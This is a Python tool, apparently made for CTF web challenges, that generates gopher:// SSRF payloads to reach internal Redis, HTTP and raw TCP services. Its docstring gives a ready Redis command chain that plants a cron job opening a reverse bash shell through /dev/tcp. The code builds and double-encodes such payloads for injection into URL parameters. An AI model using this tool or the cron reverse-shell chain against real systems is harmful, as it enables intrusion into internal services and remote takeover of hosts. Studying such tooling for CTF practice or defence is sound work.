# -*- coding: utf-8 -*-
"""gopher SSRF payload 生成器(redis / http / 原始)

参考: https://github.com/tarunkant/Gopherus (Gopherus 的轻量实现)
用途: Web/SSRF 题拿到 gopher 出口后, 生成打内网 Redis / HTTP 服务的 payload URL。

用法:
    python gopher.py --selftest                                  # 自测
    python gopher.py --type redis --host 127.0.0.1 --port 6379 \\
        --cmd "flushall" --cmd "set x \"\\n\\n*/1 * * * * bash -i >& /dev/tcp/ip/port 0>&1\\n\\n\"" \\
        --cmd "config set dir /var/spool/cron/" --cmd "config set dbfilename crontab" --cmd "save"
    python gopher.py --type http --host 127.0.0.1 --port 8080 --path /flag.php
    python gopher.py --type raw --host 127.0.0.1 --port 25 --data "<hex或文本>"
输出: gopher://host:port/_<url编码payload>(已二次编码, 可直接放 URL 参数)
"""
import argparse
import shlex
import sys
from urllib.parse import quote


def gopher_url(payload: bytes, host: str, port: int, double_encode: bool = True) -> str:
    once = quote(payload, safe='')
    if double_encode:
        once = quote(once, safe='')
    return f'gopher://{host}:{port}/_{once}'


def redis_payload(cmds) -> bytes:
    """RESP 多条命令: *N\\r\\n$len\\r\\narg\\r\\n...
    支持 shell 风格引号参数与 \\n/\\r 转义(文档里的 cron 反弹 shell 示例依赖此行为);
    原版用 cmd.split() 按空白硬切, 引号参数会被拆成多个 RESP 参数。"""
    out = b''
    for cmd in cmds:
        try:
            parts = shlex.split(cmd)
        except ValueError:
            parts = cmd.split()
        out += b'*%d\r\n' % len(parts)
        for p in parts:
            b = p.replace('\\r', '\r').replace('\\n', '\n').encode()
            out += b'$%d\r\n%s\r\n' % (len(b), b)
    return out


def http_payload(host: str, method: str = 'GET', path: str = '/',
                 headers=None, body: str = '') -> bytes:
    lines = [f'{method} {path} HTTP/1.1', f'Host: {host}']
    headers = headers or {'Connection': 'close'}
    for k, v in headers.items():
        lines.append(f'{k}: {v}')
    if body:
        lines.append(f'Content-Length: {len(body.encode())}')  # 按字节数, 原版按字符数
    return ('\r\n'.join(lines) + '\r\n\r\n' + body).encode()


def main():
    ap = argparse.ArgumentParser(description='gopher SSRF payload 生成')
    ap.add_argument('--type', choices=['redis', 'http', 'raw'], default='')
    ap.add_argument('--host', default='127.0.0.1')
    ap.add_argument('--port', type=int, default=6379)
    ap.add_argument('--cmd', action='append', default=[], help='redis 命令(可多次)')
    ap.add_argument('--path', default='/', help='http 路径')
    ap.add_argument('--method', default='GET')
    ap.add_argument('--data', default='', help='raw 模式: hex(0x前缀)或文本')
    ap.add_argument('--no-double', action='store_true', help='只做一次URL编码')
    ap.add_argument('--selftest', action='store_true')
    args = ap.parse_args()

    if args.selftest or not args.type:
        if args.type:
            ap.error('--type 为实战模式必填(自测用 --selftest)')
        selftest()
        return

    if args.type == 'redis':
        if not args.cmd:
            ap.error('--type redis 需要 --cmd(可多次)')
        payload = redis_payload(args.cmd)
    elif args.type == 'http':
        payload = http_payload(args.host, args.method, args.path)
    else:
        if not args.data:
            ap.error('--type raw 需要 --data')
        payload = (bytes.fromhex(args.data[2:]) if args.data.startswith('0x')
                   else args.data.encode())
    sys.stdout.buffer.write(payload + b'\n\n')   # 0x80-0xFF 在 GBK 控制台 print 会崩
    sys.stdout.buffer.flush()
    print(gopher_url(payload, args.host, args.port, not args.no_double))


def selftest():
    ok = True
    # RESP 格式
    p = redis_payload(['set a b'])
    good = p == b'*3\r\n$3\r\nset\r\n$1\r\na\r\n$1\r\nb\r\n'
    ok &= good
    print(f"[{'OK' if good else 'FAIL'}] RESP: {p!r}")
    # 引号参数 + \n 转义(cron 场景)
    p2 = redis_payload(['set x "\\n\\ncron"'])
    good_p2 = p2 == b'*3\r\n$3\r\nset\r\n$1\r\nx\r\n$6\r\n\n\ncron\r\n'
    ok &= good_p2
    print(f"[{'OK' if good_p2 else 'FAIL'}] RESP 引号/\\n: {p2!r}")
    # 编码: CRLF 应变成 %0D%0A(大小写不敏感), 二次编码 %250D
    u = gopher_url(p, '127.0.0.1', 6379, double_encode=True)
    good2 = u.startswith('gopher://127.0.0.1:6379/_') and '%250d%250a' in u.lower()
    ok &= good2
    print(f"[{'OK' if good2 else 'FAIL'}] 二次编码: {u[:60]}...")
    u1 = gopher_url(p, '127.0.0.1', 6379, double_encode=False)
    good3 = '%0d%0a' in u1.lower() and '%250d' not in u1.lower()
    ok &= good3
    print(f"[{'OK' if good3 else 'FAIL'}] 单次编码: {u1[:60]}...")
    # HTTP
    h = http_payload('127.0.0.1', 'GET', '/flag.php')
    good4 = h.startswith(b'GET /flag.php HTTP/1.1\r\nHost: 127.0.0.1\r\n')
    ok &= good4
    print(f"[{'OK' if good4 else 'FAIL'}] HTTP payload: {h!r}")
    sys.exit(0 if ok else 1)


if __name__ == '__main__':
    main()
